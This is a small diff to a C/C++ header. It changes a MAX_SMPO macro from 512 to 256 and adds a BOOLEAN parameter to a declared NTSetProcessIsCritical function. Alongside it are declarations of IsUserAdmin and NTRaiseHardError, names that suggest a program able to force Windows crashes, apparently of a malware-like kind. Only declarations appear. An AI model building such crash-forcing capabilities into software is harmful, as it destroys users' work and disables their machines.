@@ -11,7 +11,7 @@
 #define DEBUG
 
 // Macros
-#define MAX_SMPO 512
+#define MAX_SMPO 256
 #define MIN_RSLEN 8
 #define MAX_RSLEN 16
 
@@ -63,5 +63,5 @@ BOOL IsUserAdmin();
 
 // NT Utilitie Functions
 bool NTImportDLLFUNC();
-bool NTSetProcessIsCritical();
+bool NTSetProcessIsCritical(BOOLEAN blIscritical);
 bool NTRaiseHardError();
